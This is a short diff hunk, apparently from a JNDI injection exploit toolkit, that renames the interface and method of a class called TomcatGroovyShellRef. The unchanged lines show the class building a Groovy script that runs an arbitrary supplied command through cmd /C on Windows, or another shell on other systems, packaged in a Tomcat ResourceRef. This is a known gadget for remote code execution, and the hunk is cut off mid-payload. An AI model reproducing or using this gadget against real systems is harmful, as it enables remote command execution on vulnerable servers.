@@ -4,10 +4,10 @@ import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
 
-public class TomcatGroovyShellRef implements TomcatRef {
+public class TomcatGroovyShellRef implements ReferencePayload {
 
     @Override
-    public ResourceRef getObject(String command) throws Exception {
+    public ResourceRef getReference(String command) throws Exception {
         String payload = "if (System.properties['os.name'].toLowerCase().contains('windows')) {\n" +
             "   ['cmd','/C', '${cmd}'].execute();\n" +
             "} else {\n" +
